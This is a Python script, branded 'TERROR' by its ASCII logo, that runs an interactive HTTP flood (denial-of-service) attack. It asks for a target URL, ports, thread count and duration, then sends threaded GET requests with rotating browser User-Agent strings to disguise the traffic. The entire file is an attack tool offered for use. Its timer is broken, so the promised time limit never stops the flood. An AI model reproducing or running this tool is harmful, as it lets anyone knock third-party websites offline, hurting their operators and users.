import time
import random
import http.client
from concurrent.futures import ThreadPoolExecutor
import os
import threading

# Function to display the logo
def display_logo():
    logo = """
     _______ _______  ______  ______  _____   ______
        |    |______ |_____/ |_____/ |     | |_____/
        |    |______ |    \_ |    \_ |_____| |    \_
                                                
    """
    print(logo)

# List of random User-Agents for HTTP requests
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0.3 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:92.0) Gecko/20100101 Firefox/92.0"
]

# Global flag to stop threads after time limit
stop_threads = False

# Function to send GET requests
def send_request(url, port=80):
    global stop_threads
    while not stop_threads:
        try:
            # Parse the URL
            host = url.split("/")[0]
            path = "/" + "/".join(url.split("/")[1:]) if "/" in url else "/"

            # Establish connection
            conn = http.client.HTTPConnection(host, port, timeout=3)

            headers = {
                "User-Agent": random.choice(user_agents),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "keep-alive",
            }

            # Send GET request
            conn.request("GET", path, headers=headers)
            response = conn.getresponse()
            print(f"[SUCCESS] Request sent to {url}:{port} - Status Code: {response.status}")
            conn.close()
        except Exception as e:
            print(f"[FAILED] Request to {url}:{port} failed - {e}")

# Function to manage HTTP flood attacks with time limit
def start_flood(target_url, num_threads, ports, time_limit):
    global stop_threads
    total_requests = 0
    start_time = time.time()
    
    def time_tracker():
        while not stop_threads:
            elapsed = time.time() - start_time
            remaining = max(0, time_limit - elapsed)
            print(f"Time Remaining: {int(remaining)} seconds", end="\r")
            if remaining <= 0:
                stop_threads = True
                break
            time.sleep(1)
    
    tracker_thread = threading.Thread(target=time_tracker)
    tracker_thread.start()
    
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        while not stop_threads:
            for port in ports:
                executor.submit(send_request, target_url, port)
                total_requests += 1

    tracker_thread.join()
    print("\nAttack completed.")

# Function to check device compatibility
def check_device():
    total_memory = os.sysconf('SC_PAGE_SIZE') * os.sysconf('SC_PHYS_PAGES') / (1024 ** 3)
    if total_memory < 2:
        print("Device RAM is below 2GB. Recommended thread limit: 100")
        return 100
    elif total_memory < 4:
        print("Device RAM is between 2GB and 4GB. Recommended thread limit: 500")
        return 500
    else:
        print("Device RAM is 4GB or higher. Recommended thread limit: 1000+")
        return 1000

# Main menu
def main():
    global stop_threads
    display_logo()
    recommended_threads = check_device()
    print("\n[1] Start HTTP Flood")
    print("[2] Exit")
    choice = input("Enter your choice: ")

    if choice == '1':
        url = input("Enter target URL (e.g., example.com/path): ")
        ports = list(map(int, input("Enter target ports (comma-separated, e.g., 80,443): ").split(",")))
        threads = int(input(f"Enter number of threads (recommended {recommended_threads}): "))
        time_limit = int(input("Enter attack duration in seconds: "))
        print("\nStarting HTTP flood attack...")
        time.sleep(2)
        start_flood(url, threads, ports, time_limit)
        stop_threads = True
    elif choice == '2':
        print("\nExiting program. Stay safe!")
        exit()
    else:
        print("\nInvalid choice. Please try again.")

if __name__ == "__main__":
    main()